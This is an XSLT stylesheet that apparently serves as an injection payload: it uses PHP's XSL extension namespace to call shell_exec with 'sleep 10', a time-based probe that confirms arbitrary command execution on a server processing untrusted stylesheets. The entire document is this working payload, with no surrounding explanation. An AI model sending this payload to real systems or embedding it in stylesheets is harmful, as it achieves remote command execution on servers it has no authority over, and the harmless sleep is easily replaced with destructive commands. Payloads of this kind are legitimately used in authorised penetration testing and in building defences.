<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  
  <xsl:template match="/">
    <html>
      <body>
        <xsl:value-of select="php:function('shell_exec', 'sleep 10')" />
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
